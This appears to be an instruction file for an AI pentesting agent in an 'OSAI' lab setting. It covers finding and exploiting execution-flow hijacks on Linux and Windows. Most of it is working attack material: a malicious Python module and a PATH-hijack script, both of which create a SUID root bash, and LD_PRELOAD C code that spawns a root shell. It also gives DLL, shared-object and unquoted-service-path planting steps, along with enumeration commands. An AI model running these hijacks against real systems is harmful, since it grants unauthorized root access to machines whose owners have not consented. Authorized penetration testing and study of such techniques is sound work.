Find and exploit execution-flow hijacks — a writable location that a program's loader/interpreter trusts before the real target. $ARGUMENTS = OS (win/linux), and/or context (a service, cron, scheduled task, or app that runs as a higher-priv user). Write results to ~/osai/current/loot/hijack_paths.md.

## The idea (matches the OSAI lab: python module hijack on an SMB share)
Programs resolve imports/libraries/binaries by searching an ordered list of paths.
If you can WRITE to a directory that is searched BEFORE the legitimate one, and a
higher-priv process runs the program, your file executes as that user. Find the
writable link in the chain.

## LINUX

### 1. Python module / sys.path hijack (the SMB-share lab pattern)
```bash
# What runs as root/other and imports modules? (cron, systemd, app scripts)
grep -rE 'import |from .* import' /opt /srv /usr/local/bin 2>/dev/null | head
# sys.path[0] is the SCRIPT'S OWN DIR — if that dir (or an SMB/NFS mount it lives on)
# is writable, drop a module named exactly what it imports:
python3 -c "import sys; print(sys.path)"    # run as the target context if possible
# Writable dir on the path + script does 'import pandas' →
cat > <WRITABLE_PATH>/pandas.py <<'PY'
import os; os.system('cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash')  # or reverse shell (Kapi builds it)
PY
# When the privileged script runs, it imports YOUR pandas.py first.
# Also check .pth files in site-packages (auto-imported) and PYTHONPATH env.
find / -name '*.pth' 2>/dev/null; env | grep -i python
```

### 2. PATH hijack (relative binary called by a root script)
```bash
# Script/SUID binary calls e.g. `service`, `tar`, `ps` WITHOUT a full path:
strings /path/to/suid_or_script | grep -E '^[a-z]+$'    # candidate bare commands
export PATH=/tmp:$PATH
cat > /tmp/<command> <<'SH'
#!/bin/bash
cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash
SH
chmod +x /tmp/<command>    # run the privileged trigger → /tmp/rootbash -p
```

### 3. LD_PRELOAD / LD_LIBRARY_PATH (sudo env_keep, or writable lib dir)
```bash
sudo -l    # look for env_keep+=LD_PRELOAD
cat > /tmp/x.c <<'C'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
C
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <ALLOWED_CMD>
```

### 4. Shared-object (.so) hijack for a custom binary
```bash
ldd /path/to/target_binary        # find a MISSING or writable-dir .so
# Drop a malicious .so with the expected name in the searched writable dir.
```

### 5. Writable cron / systemd / service PATH
```bash
cat /etc/crontab; ls -la /etc/cron.*    # bare-command cron running as root + writable PATH dir
systemctl list-timers; grep -rl 'ExecStart' /etc/systemd/system 2>/dev/null | xargs ls -la
# Writable unit / script referenced by ExecStart → edit → systemctl restart (if allowed) or wait
```

## WINDOWS

### 6. DLL hijack (missing/writable DLL in the search order)
```
# Find services/apps whose EXE dir OR a PATH dir is writable, and that load a DLL
# not present in System32 (loader falls back to the app dir / PATH).
# Enumerate with the winPEAS output → /osai-winpeas flags "DLL Hijacking" candidates.
icacls "C:\Program Files\<app>"          # look for (F)/(M) for your group / Everyone / Users
# Place a malicious <missing>.dll (Kapi builds it) → restart service / relogin.
```

### 7. Unquoted service path
```
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
# Space in an unquoted path + writable intermediate dir → drop C:\Program.exe etc.
sc qc <service>   ;   restart to trigger
```

### 8. Windows PATH / current-dir binary planting
```
# App calls a bare EXE (e.g. `cmd`, a helper) and a writable dir precedes System32 in PATH:
echo %PATH%     ;    icacls <each writable path dir>
```

## Detection helper
- Windows: run winPEAS → pipe to /osai-winpeas (flags DLL hijack, unquoted path, writable service)
- Linux:   run linPEAS → pipe to /osai-winpeas ; also /osai-linux-attack for the full privesc set
- The winning question is always: "what higher-priv thing runs, and which dir in its
  search order can I write to?" Verify writability with `icacls` / `ls -la` BEFORE planting.

## Output — findings to log
```
/osai-notes --host <IP> --title "Python module hijack via writable share → RCE as <user>" --severity Critical --evidence "<dropped module + resulting exec>"
/osai-notes --host <IP> --title "Unquoted service path privesc" --severity High --evidence "<service + writable dir>"
```
MITRE: T1574 (Hijack Execution Flow) and sub-techniques (.001 DLL, .007 PATH, .006 LD_PRELOAD).
Write viable paths to ~/osai/current/loot/hijack_paths.md.

## Token discipline
- Enumerate writability first; only plant where you've confirmed write + a privileged trigger
- Payloads/shells are Kapi's to build — this skill finds the hijack point and the trigger
